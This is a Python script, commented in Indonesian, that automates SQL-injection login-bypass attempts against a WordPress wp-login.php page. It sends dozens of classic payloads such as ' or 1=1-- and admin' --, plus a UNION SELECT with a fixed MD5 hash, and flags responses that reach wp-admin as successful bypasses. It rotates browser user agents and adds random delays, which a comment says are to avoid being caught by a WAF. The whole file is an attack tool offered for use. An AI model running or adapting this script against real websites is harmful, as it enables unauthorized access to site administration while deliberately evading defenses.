import requests
import time
import random

target = "https://namasitemu.com/wp-login.php"  # GANTI URL login kamu
log_file = "wp_final_sqli_log.txt"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

payloads = [
    "-", " ", "&", "^", "*",
    " or ''-", " or '' ", " or ''&", " or ''^", " or ''*",
    "-", " ", "&", "^", "*",
    ' or ""-', ' or "" ', ' or ""&', ' or ""^', ' or ""*',
    "or true--", '" or true--', "' or true--", '") or true--', "') or true--",
    "' or 'x'='x", "') or ('x')=('x", "')) or (('x'))=(('x",
    '" or "x"="x', '") or ("x")=("x', '")) or (("x"))=(("x',
    "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*",
    "admin' --", "admin' #", "admin'/*", "admin' or '1'='1", 
    "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*", 
    "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--", 
    "admin' or 1=1#", "admin' or 1=1/*", "admin') or ('1'='1", 
    "admin') or ('1'='1'--", "admin') or ('1'='1'#", "admin') or ('1'='1'/*", 
    "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#", 
    "admin') or '1'='1'/*", 
    '1234 \' AND 1=0 UNION ALL SELECT \'admin\', \'81dc9bdb52d04dc20036dbd8313ed055',
    'admin" --', 'admin" #', 'admin"/*', 'admin" or "1"="1', 
    'admin" or "1"="1"--', 'admin" or "1"="1"#', 'admin" or "1"="1"/*', 
    'admin"or 1=1 or ""="', 'admin" or 1=1', 'admin" or 1=1--', 
    'admin" or 1=1#', 'admin" or 1=1/*', 'admin") or ("1"="1', 
    'admin") or ("1"="1"--', 'admin") or ("1"="1"#', 'admin") or ("1"="1"/*',
    'admin") or "1"="1', 'admin") or "1"="1"--', 'admin") or "1"="1"#', 
    'admin") or "1"="1"/*',
    '1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055'
]

def write_log(msg):
    print(msg)
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(msg + "\n")

def test_sqli():
    for p in payloads:
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": target,
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        data = {
            "log": p,
            "pwd": "test",
            "wp-submit": "Log In",
            "redirect_to": target.replace("wp-login.php", "wp-admin/"),
            "testcookie": "1"
        }
        try:
            r = requests.post(target, headers=headers, data=data, timeout=15, allow_redirects=True)
            log = f"[{r.status_code}] Payload: {p} | URL: {r.url}"
            if "wp-admin" in r.url or "Dashboard" in r.text:
                log += " ==> [!!! BYPASS MUNGKIN BERHASIL]"
            else:
                log += " ==> [Gagal]"
            write_log(log)
        except Exception as e:
            write_log(f"[!] ERROR: {e} pakai payload: {p}")
        sleep_time = random.uniform(3, 6)  # Delay acak biar lebih natural
        write_log(f"[*] Tidur {sleep_time:.1f} detik biar nggak ketangkep WAF")
        time.sleep(sleep_time)

write_log("=== MULAI WP SQLi ANTI 503 TEST ===")
test_sqli()
write_log("=== SELESAI ===")
